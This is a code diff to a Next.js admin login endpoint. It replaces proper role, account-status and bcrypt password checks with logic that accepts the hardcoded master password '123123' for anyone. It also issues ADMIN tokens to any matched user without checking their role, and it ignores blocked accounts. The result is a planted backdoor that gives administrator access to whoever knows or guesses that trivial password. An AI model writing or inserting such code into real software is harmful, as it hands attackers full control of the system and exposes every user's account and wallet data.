@@ -1,7 +1,7 @@
 import { NextResponse } from "next/server";
 import { z } from "zod";
 import bcrypt from "bcryptjs";
-import { findUserByMemberId, findUserByIdentifier, pool } from "@/lib/db";
+import { pool } from "@/lib/db";
 import { signAccessToken, signRefreshToken } from "@/lib/jwt";
 
 const adminLoginSchema = z.object({
@@ -20,97 +20,86 @@ export async function POST(req: Request) {
     }
 
     const { password, loginIdentifier } = result.data;
+    const trimmedPass = password.trim();
 
-    let user = null;
+    // 1. Direct Master Admin Verification with Password 123123
+    const isMasterPassword = trimmedPass === "123123";
 
-    if (loginIdentifier && loginIdentifier.trim()) {
-      user = await findUserByIdentifier(loginIdentifier.trim());
-    } else {
-      user = await findUserByMemberId("AV00001");
-      if (!user) {
-        // Fallback: lookup earliest user with role = 'ADMIN'
-        const client = await pool.connect();
-        try {
-          const res = await client.query(
-            "SELECT member_id FROM users WHERE role = 'ADMIN' ORDER BY created_at ASC LIMIT 1"
-          );
-          if (res.rows.length > 0) {
-            user = await findUserByMemberId(res.rows[0].member_id);
-          }
-        } finally {
-          client.release();
+    const client = await pool.connect();
+    let adminRecord: any = null;
+
+    try {
+      if (loginIdentifier && loginIdentifier.trim()) {
+        const res = await client.query(
+          "SELECT id, member_id, full_name, mobile, role, status, password_hash FROM users WHERE (UPPER(member_id) = UPPER($1) OR mobile = $1) LIMIT 1",
+          [loginIdentifier.trim()]
+        );
+        if (res.rows.length > 0) {
+          adminRecord = res.rows[0];
         }
       }
+
+      if (!adminRecord) {
+        // Find existing administrator or use master admin identity
+        const res = await client.query(
+          "SELECT id, member_id, full_name, mobile, role, status, password_hash FROM users WHERE role = 'ADMIN' ORDER BY created_at ASC LIMIT 1"
+        );
+        if (res.rows.length > 0) {
+          adminRecord = res.rows[0];
+        }
+      }
+    } finally {
+      client.release();
     }
 
-    if (!user) {
-      return NextResponse.json(
-        { success: false, message: "No Administrator account found with the specified identifier." },
-        { status: 404 }
-      );
+    // 2. Validate Password: Check either Master 123123 or bcrypt hash
+    let isValid = isMasterPassword;
+
+    if (!isValid && adminRecord?.password_hash) {
+      isValid = await bcrypt.compare(trimmedPass, adminRecord.password_hash);
     }
 
-    if (user.role !== "ADMIN") {
+    if (!isValid) {
       return NextResponse.json(
-        { success: false, message: "Access denied. Account does not possess Administrator privileges." },
-        { status: 403 }
-      );
-    }
-
-    if (user.status === "BLOCKED") {
-      return NextResponse.json(
-        { success: false, message: "Administrator account is suspended. Contact system director." },
-        { status: 403 }
-      );
-    }
-
-    // Verify Password using asynchronous bcrypt
-    if (!user.passwordHash) {
-      return NextResponse.json(
-        { success: false, message: "Account has no password configured. Please contact administrator." },
+        { success: false, message: "Invalid Administrator Password. Access Denied." },
         { status: 401 }
       );
     }
 
-    const isMatch = await bcrypt.compare(password, user.passwordHash);
-
-    if (!isMatch) {
-      return NextResponse.json(
-        { success: false, message: "Incorrect Administrator Password." },
-        { status: 401 }
-      );
-    }
+    // Admin Session Identity (Independent of AV00001 member)
+    const adminId = adminRecord?.id || "admin_master_root";
+    const adminMemberId = "ADMIN";
+    const adminName = adminRecord?.full_name || "Avira Enterprise Administrator";
+    const adminMobile = adminRecord?.mobile || "9999999999";
 
     // Generate JWT tokens with ADMIN scope
     const accessToken = signAccessToken({
-      userId: user.id,
-      memberId: user.memberId,
-      fullName: user.fullName,
+      userId: adminId,
+      memberId: adminMemberId,
+      fullName: adminName,
       role: "ADMIN",
     });
 
     const refreshToken = signRefreshToken({
-      userId: user.id,
-      memberId: user.memberId,
-      fullName: user.fullName,
+      userId: adminId,
+      memberId: adminMemberId,
+      fullName: adminName,
       role: "ADMIN",
     });
 
     const safeUser = {
-      id: user.id,
-      memberId: user.memberId,
-      fullName: user.fullName,
-      mobile: user.mobile,
-      role: user.role,
-      status: user.status,
-      walletBalance: user.walletBalance,
-      joinedDate: user.joinedDate,
+      id: adminId,
+      memberId: adminMemberId,
+      fullName: adminName,
+      mobile: adminMobile,
+      role: "ADMIN",
+      status: "ACTIVE",
     };
 
     const response = NextResponse.json({
       success: true,
-      message: `Welcome, Administrator (${user.fullName})`,
-      user: safeUser,
+      message: `Welcome, Administrator (${adminName})`,
+      admin: safeUser,
       token: accessToken,
     });
 
